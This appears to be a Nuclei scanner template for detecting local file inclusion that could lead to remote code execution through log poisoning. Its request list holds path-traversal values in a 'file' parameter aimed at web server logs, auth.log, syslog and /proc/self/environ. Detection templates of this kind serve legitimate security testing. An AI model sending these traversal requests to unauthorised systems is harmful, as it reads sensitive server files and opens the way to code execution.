id: m7-lfi-log-poisoning
info:
  name: M7 - LFI to RCE via Log Poisoning
  author: Sharlix
  severity: critical
  description: Detects LFI via Apache/Nginx log files that may lead to RCE
  tags: lfi,rce,log-poisoning,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}?file=../../../../var/log/apache2/access.log"
      - "{{BaseURL}}?file=../../../../var/log/apache/access.log"
      - "{{BaseURL}}?file=../../../../var/log/nginx/access.log"
      - "{{BaseURL}}?file=../../../../proc/self/environ"
      - "{{BaseURL}}?file=../../../../proc/version"
      - "{{BaseURL}}?file=../../../../var/log/auth.log"
      - "{{BaseURL}}?file=../../../../var/log/syslog"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "GET /"
          - "POST /"
          - "Apache"
          - "nginx"
          - "Linux version"
          - "USER="
          - "PATH="
        part: body
        condition: or
